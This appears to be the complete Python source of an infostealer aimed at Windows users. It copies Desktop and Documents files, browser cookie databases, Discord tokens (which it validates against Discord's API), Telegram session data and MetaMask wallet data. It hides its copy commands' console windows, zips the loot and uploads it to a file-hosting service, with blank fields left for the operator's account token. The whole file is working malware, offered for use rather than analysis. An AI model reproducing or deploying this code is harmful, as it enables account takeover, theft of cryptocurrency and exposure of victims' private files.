import os, platform,shutil,requests
from re import findall
import subprocess
import requests
home_path=os.path.expanduser("~")
pc_name=platform.uname()[1]
save_path=home_path+r"\\"+pc_name
os.mkdir(save_path)

def collect_files():
    global home_path
    global pc_name
    global save_path
    
    file_extensions=(".docx",".txt",".doc",".xls",".xlsx",".ppt",".pptx",".pdf")
    desktop_path=home_path+r"\\Desktop"
    possible_document=home_path+r"\\Documents"

    for root, dirs, files in os.walk(desktop_path):
        for file in files:
            if file.endswith(file_extensions):
                source_path = os.path.join(root, file)
                relative_path = os.path.relpath(source_path, desktop_path)
                destination_path = os.path.join(save_path+"\\dosyalar", relative_path)
                
                # Oluşturulacak hedef dizinleri
                os.makedirs(os.path.dirname(destination_path), exist_ok=True)
                
                shutil.copy(source_path, destination_path)

    for root, dirs, files in os.walk(possible_document):
        for file in files:
            if file.endswith(file_extensions):
                source_path = os.path.join(root, file)
                relative_path = os.path.relpath(source_path, possible_document)
                destination_path = os.path.join(save_path+"\\dosyalar", relative_path)
                
                # Oluşturulacak hedef dizinleri
                os.makedirs(os.path.dirname(destination_path), exist_ok=True)
                
                shutil.copy(source_path, destination_path)


def browser():
    global home_path
    global pc_name
    global save_path

    brave_path=home_path+r"\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies"
    chrome_path=home_path+r"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
    edge_path=home_path+r"\\AppData\\Local\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"
    opera_path=home_path+r"\\AppData\\Local\\Opera Software\\Opera Stable\\Network\\Cookies"
    if os.path.exists(brave_path):
        shutil.copy(brave_path,save_path+r"\\brave_cookie")
    if os.path.exists(chrome_path):
        shutil.copy(chrome_path,save_path+r"\\chrome_cookie")
    if os.path.exists(edge_path):
        shutil.copy(edge_path,save_path+r"\\edge_cookie")
    if os.path.exists(opera_path):
        shutil.copy(opera_path,save_path+r"\\opera_cookie")


def chatting_app():
    global home_path
    global pc_name
    global save_path

    d_headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
        "Authorization":None
    }
    discord_path=home_path+r"\\AppData\\Roaming\\discord\\Local Storage\\leveldb"
    telegram_path=home_path+r"\\AppData\\Roaming\\Telegram Desktop\\tdata"
    tokens = []
    try:
        if os.path.exists(discord_path):
            for file_name in os.listdir(discord_path):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                    continue
                for line in [x.strip() for x in open(f"{discord_path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            tokens.append(token)
            for token in tokens:
                d_headers["Authorization"]=token
                r=requests.get("https://discordapp.com/api/v9/users/@me", headers=d_headers).text
                open(save_path+r"\\discord.txt","a").write("token="+token)
                open(save_path+r"\\discord.txt","a").write(r)
        if os.path.exists(telegram_path):
            subprocess.run(["xcopy",telegram_path, save_path+r"\\Telegram\\tdata","/E", "/I", "/Y"],creationflags=0x08000000)
            subprocess.run(["xcopy",telegram_path+r"\\user_data", save_path+r"\\Telegram\\tdata\\user_data","/E", "/I", "/Y"],creationflags=0x08000000)

    except PermissionError:
        return 0


def wallet():
    global home_path
    global pc_name
    global save_path

    brave_metamask=home_path+r"\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"
    chrome_metamask=home_path+r"\\AppData\\Local\\Google\\Chrome\\User Data\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"
    edge_metamask=home_path+r"\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"
    opera_metamask=home_path+r"\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"
    try:
        if os.path.exists(brave_metamask):
            subprocess.run(["xcopy",brave_metamask, save_path+r"\\brave_metamask","/E", "/I", "/Y"],creationflags=0x08000000)
        if os.path.exists(chrome_metamask):
            subprocess.run(["xcopy",chrome_metamask, save_path+r"\\chrome_metamask","/E", "/I", "/Y"],creationflags=0x08000000)
        if os.path.exists(edge_metamask):
            subprocess.run(["xcopy",edge_metamask, save_path+r"\\edge_metamask","/E", "/I", "/Y"],creationflags=0x08000000)
        if os.path.exists(opera_metamask):
            subprocess.run(["xcopy",opera_metamask, save_path+r"\\opera_metamask","/E", "/I", "/Y"],creationflags=0x08000000)
    except PermissionError:
        return 0
def send_file(attachment_path,url):
    requests.post(
        
        url=f"https://store1.gofile.io/uploadFile",
        data={
            "token": "",#your token
            "folderId": ""#your folder id
        },
        files={"upload_file": open(attachment_path, "rb")}
    ).json()
def start_4ttaCk():
    global home_path
    global pc_name
    global save_path
    collect_files()
    browser()
    chatting_app()
    wallet()
    shutil.make_archive(home_path+r"\\"+pc_name,"zip",save_path)
    send_file(save_path+".zip","")

start_4ttaCk()
